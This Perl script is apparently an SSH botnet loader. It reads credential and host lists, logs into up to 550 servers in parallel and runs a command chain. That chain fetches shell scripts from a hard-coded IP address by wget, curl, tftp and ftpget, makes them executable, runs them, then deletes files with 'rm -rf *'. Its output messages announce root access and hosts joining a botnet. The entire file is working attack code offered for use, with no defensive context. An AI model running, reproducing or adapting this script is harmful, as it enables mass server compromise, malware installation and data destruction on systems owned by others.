#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://116.103.228.238/ohshit.sh; curl -O http://116.103.228.238/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 116.103.228.238 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 116.103.228.238; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 116.103.228.238 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
                } else {
                        print "\e[34;1mScanning \x1b[1;35mSSH\n";
                }
        } else {
                print "\e[36;1mLoading [\x1b[1;32mGOOFY\x1b[1;37m] JOINED Slumpnett\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

